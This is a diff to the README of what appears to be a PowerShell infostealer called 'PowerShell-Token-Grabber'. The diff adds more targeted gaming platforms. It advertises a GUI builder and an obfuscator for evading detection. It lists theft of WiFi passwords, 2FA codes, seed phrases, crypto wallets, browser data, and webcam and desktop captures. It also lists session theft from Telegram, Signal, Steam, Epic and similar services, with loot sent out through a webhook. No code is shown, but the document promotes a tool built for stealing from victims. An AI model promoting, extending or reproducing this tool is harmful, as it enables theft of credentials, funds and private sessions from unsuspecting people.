@@ -45,8 +45,10 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 
 
  ## 🔷 Webhook Data
-> ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
-> ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/8a15c7d4-8d70-4d17-81c2-f9f602ccd81a)
+> ![screenshot](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/df915e8d-3050-427f-860d-ff76c3ef9785)
+
+> ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/1c16ee59-0bea-41e7-af10-e31ce739ac49)
+
 
 #  Features
 - [x] GUI Builder
@@ -57,12 +59,17 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] Extracts WiFi Passwords
 - [x] Files ```2fa, backupcodes, seedphrases, passwords, etc.``` 
 - [x] 📷 Webcam & Desktop Screenshots
-- [x] Session Stealers
+## Session Stealers
+  ### Messaging
   - [Telegram](https://telegram.org) 
   - [Element](https://element.io) 
   - [Signal](https://signal.org) 
-  - [Steam](https://store.steampowered.com) 
+  ### Gaming 
+  - [Steam](https://store.steampowered.com)
   - [Minecraft](https://minecraft.net)
+  - [Epicgames](https://store.epicgames.com)
+  - [Ubisoft](https://ubisoftconnect.com)
+  - [EA](https://ea.com)
 - [x] Crypto Wallets 
    > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
 - [x] Browsers (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
